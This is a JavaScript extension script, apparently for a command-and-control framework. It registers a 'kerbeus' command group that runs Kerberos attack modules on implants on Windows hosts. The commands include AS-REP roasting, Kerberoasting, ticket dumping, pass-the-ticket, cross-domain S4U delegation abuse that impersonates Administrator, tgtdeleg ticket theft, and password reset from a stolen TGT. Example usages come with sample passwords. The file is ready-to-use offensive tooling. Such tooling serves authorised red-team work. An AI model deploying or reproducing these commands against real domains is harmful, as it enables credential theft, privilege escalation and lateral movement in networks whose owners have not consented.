
let _cmd_asreproasting = ax.create_command("asreproasting", "Perform AS-REP roasting", "kerbeus asreproasting /user:pre_user");
_cmd_asreproasting.addArgString("params", true, "Args: /user:USER [/dc:DC] [/domain:DOMAIN]");
_cmd_asreproasting.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)  {
    let params = parsed_json["params"];

    let bof_params = ax.bof_pack("cstr", [params]);
    let bof_path = ax.script_dir() + "_bin/Kerbeus-BOF/asreproasting." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: Kerbeus ASREPROASTING");
});

let _cmd_asktgt = ax.create_command("asktgt", "Retrieve a TGT", "kerbeus asktgt /user:Admin /password:QWErty /enctype:aes256 /opsec /ptt");
_cmd_asktgt.addArgString("params", true, "Args: /user:USER /password:PASSWORD [/domain:DOMAIN] [/dc:DC] [/enctype:(rc4|aes256)] [/ptt] [/nopac] [/opsec]\n                              /user:USER /aes256:HASH [/domain:DOMAIN] [/dc:DC] [/ptt] [/nopac] [/opsec]\n                              /user:USER /rc4:HASH [/domain:DOMAIN] [/dc:DC] [/ptt] [/nopac]\n                              /user:USER /nopreauth [/domain:DOMAIN] [/dc:DC] [/ptt]");
_cmd_asktgt.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)  {
    let params = parsed_json["params"];

    let bof_params = ax.bof_pack("cstr", [params]);
    let bof_path = ax.script_dir() + "_bin/Kerbeus-BOF/asktgt." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: Kerbeus ASKTGT");
});

let _cmd_asktgs = ax.create_command("asktgs", "Retrieve a TGS", "kerbeus asktgs /service:CIFS/dc.domain.local /ticket:doIF8DCCBey... /opsec");
_cmd_asktgs.addArgString("params", true, "Args: /ticket:BASE64 /service:SPN1,SPN2,... [/domain:DOMAIN] [/dc:DC] [/tgs:BASE64] [/targetdomain:DOMAIN] [/targetuser:USER] [/enctype:(rc4|aes256)] [/ptt] [/keylist] [/u2u] [/opsec]");
_cmd_asktgs.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)  {
    let params = parsed_json["params"];

    let bof_params = ax.bof_pack("cstr", [params]);
    let bof_path = ax.script_dir() + "_bin/Kerbeus-BOF/asktgs." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: Kerbeus ASKTGS");
});

let _cmd_changepw = ax.create_command("changepw", "Reset a user's password from a supplied TGT", "kerbeus changepw /new:New_P4ss /ticket:doIF8DCCBey...");
_cmd_changepw.addArgString("params", true, "Args: /ticket:BASE64 /new:PASSWORD [/dc:DC] [/targetuser:USER] [/targetdomain:DOMAIN]");
_cmd_changepw.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)  {
    let params = parsed_json["params"];

    let bof_params = ax.bof_pack("cstr", [params]);
    let bof_path = ax.script_dir() + "_bin/Kerbeus-BOF/changepw." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: Kerbeus CHANGEPW");
});

let _cmd_describe = ax.create_command("describe", "Parse and describe a ticket", "kerbeus describe /ticket:doIF8DCCBey...");
_cmd_describe.addArgString("params", true, "Args: /ticket:BASE64");
_cmd_describe.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)  {
    let params = parsed_json["params"];

    let bof_params = ax.bof_pack("cstr", [params]);
    let bof_path = ax.script_dir() + "_bin/Kerbeus-BOF/describe." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: Kerbeus DESCRIBE");
});

let _cmd_dump = ax.create_command("dump", "Dump tickets", "kerbeus dump");
_cmd_dump.addArgString("params", "Args: [/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT]", "");
_cmd_dump.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)  {
    let params = parsed_json["params"];

    let bof_params = ax.bof_pack("cstr", [params]);
    let bof_path = ax.script_dir() + "_bin/Kerbeus-BOF/dump." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: Kerbeus DUMP");
});

let _cmd_hash = ax.create_command("hash", "Calculate rc4_hmac, aes128_cts_hmac_sha1, aes256_cts_hmac_sha1 hashes", "kerbeus hash /password:!Q@W3e4r");
_cmd_hash.addArgString("params", true, "Args: /password:PASSWORD [/user:USER] [/domain:DOMAIN]");
_cmd_hash.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)  {
    let params = parsed_json["params"];

    let bof_params = ax.bof_pack("cstr", [params]);
    let bof_path = ax.script_dir() + "_bin/Kerbeus-BOF/hash." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: Kerbeus HASH");
});

let _cmd_kerberoasting = ax.create_command("kerberoasting", "Perform Kerberoasting", "kerbeus kerberoasting /spn:CIFS/COMP.domain.local /ticket:doIF8DCCBey...");
_cmd_kerberoasting.addArgString("params", true, "Args: /spn:SPN [/nopreauth:USER] [/dc:DC] [/domain:DOMAIN]\n                              /spn:SPN /ticket:BASE64 [/dc:DC]");
_cmd_kerberoasting.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)  {
    let params = parsed_json["params"];

    let bof_params = ax.bof_pack("cstr", [params]);
    let bof_path = ax.script_dir() + "_bin/Kerbeus-BOF/kerberoasting." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: Kerbeus KERBEROASTING");
});

let _cmd_klist = ax.create_command("klist", "List tickets", "kerbeus klist /luid:3ea8");
_cmd_klist.addArgString("params", "Args: [/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT]", "");
_cmd_klist.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)  {
    let params = parsed_json["params"];

    let bof_params = ax.bof_pack("cstr", [params]);
    let bof_path = ax.script_dir() + "_bin/Kerbeus-BOF/klist." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: Kerbeus KLIST");
});

let _cmd_ptt = ax.create_command("ptt", "Submit a TGT", "kerbeus ptt /ticket:doIF8DCCBey...");
_cmd_ptt.addArgString("params", true, "Args: /ticket:BASE64 [/luid:LOGONID]");
_cmd_ptt.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)  {
    let params = parsed_json["params"];

    let bof_params = ax.bof_pack("cstr", [params]);
    let bof_path = ax.script_dir() + "_bin/Kerbeus-BOF/ptt." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: Kerbeus PTT");
});

let _cmd_purge = ax.create_command("purge", "Purge tickets", "kerbeus purge /luid:3ea8");
_cmd_purge.addArgString("params", "Args: [/luid:LOGONID]", "");
_cmd_purge.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)  {
    let params = parsed_json["params"];

    let bof_params = ax.bof_pack("cstr", [params]);
    let bof_path = ax.script_dir() + "_bin/Kerbeus-BOF/purge." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: Kerbeus PURGE");
});

let _cmd_renew = ax.create_command("renew", "Renew a TGT", "kerbeus renew /ticket:doIF8DCCBey...");
_cmd_renew.addArgString("params", true, "Args: /ticket:BASE64 [/dc:DC] [/ptt]");
_cmd_renew.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)  {
    let params = parsed_json["params"];

    let bof_params = ax.bof_pack("cstr", [params]);
    let bof_path = ax.script_dir() + "_bin/Kerbeus-BOF/renew." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: Kerbeus RENEW");
});

let _cmd_s4u = ax.create_command("s4u", "Perform S4U constrained delegation abuse", "kerbeus s4u /ticket:doIF8DCCBey... /impersonateuser:Administrator /service:host/comp.domain.local /altservice:http,cifs");
_cmd_s4u.addArgString("params", true, "Args: /ticket:BASE64 /service:SPN {/impersonateuser:USER | /tgs:BASE64} [/domain:DOMAIN] [/dc:DC] [/altservice:SERVICE] [/ptt] [/nopac] [/opsec] [/self]");
_cmd_s4u.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)  {
    let params = parsed_json["params"];

    let bof_params = ax.bof_pack("cstr", [params]);
    let bof_path = ax.script_dir() + "_bin/Kerbeus-BOF/s4u." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: Kerbeus S4U");
});

let _cmd_cross_s4u = ax.create_command("cross_s4u", "Perform S4U constrained delegation abuse across domains", "kerbeus cross_s4u /ticket:doIF8DCCBey... /impersonateuser:Administrator /targetdomain:sdomain.local /targetdc:dc.sdomain.local /service:host/comp.sdomain.local /altservice:http,cifs");
_cmd_cross_s4u.addArgString("params", true, "Args: krb_cross_s4u /ticket:BASE64 /service:SPN /targetdomain:DOMAIN /targetdc:DC {/impersonateuser:USER | /tgs:BASE64} [/domain:DOMAIN] [/dc:DC] [/altservice:SERVICE] [/nopac] [/self]");
_cmd_cross_s4u.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)  {
    let params = parsed_json["params"];

    let bof_params = ax.bof_pack("cstr", [params]);
    let bof_path = ax.script_dir() + "_bin/Kerbeus-BOF/cross_s4u." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: Kerbeus CROSS_S4U");
});

let _cmd_tgtdeleg = ax.create_command("tgtdeleg", "Retrieve a usable TGT for the current user without elevation by abusing the Kerberos GSS-API", "kerbeus tgtdeleg");
_cmd_tgtdeleg.addArgString("params", "Args: [/target:SPN]", "");
_cmd_tgtdeleg.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)  {
    let params = parsed_json["params"];

    let bof_params = ax.bof_pack("cstr", [params]);
    let bof_path = ax.script_dir() + "_bin/Kerbeus-BOF/tgtdeleg." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: Kerbeus TGTDELEG");
});

let _cmd_triage = ax.create_command("triage", "List tickets in table format", "kerbeus triage /luid:3ea8");
_cmd_triage.addArgString("params", "Args: [/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT]", "");
_cmd_triage.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)  {
    let params = parsed_json["params"];

    let bof_params = ax.bof_pack("cstr", [params]);
    let bof_path = ax.script_dir() + "_bin/Kerbeus-BOF/triage." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: Kerbeus TRIAGE");
});

var cmd_kerbeus = ax.create_command("kerbeus", "Kerberos abuse (kerbeus BOF)");
cmd_kerbeus.addSubCommands([_cmd_asreproasting, _cmd_asktgt, _cmd_asktgs, _cmd_changepw, _cmd_dump, _cmd_hash, _cmd_kerberoasting, _cmd_klist, _cmd_ptt, _cmd_describe, _cmd_purge, _cmd_renew, _cmd_s4u, _cmd_cross_s4u, _cmd_tgtdeleg, _cmd_triage]);

var group_kerbeus = ax.create_commands_group("Kerbeus-BOF", [cmd_kerbeus]);
ax.register_commands_group(group_kerbeus, ["beacon", "gopher", "kharon"], ["windows"], []);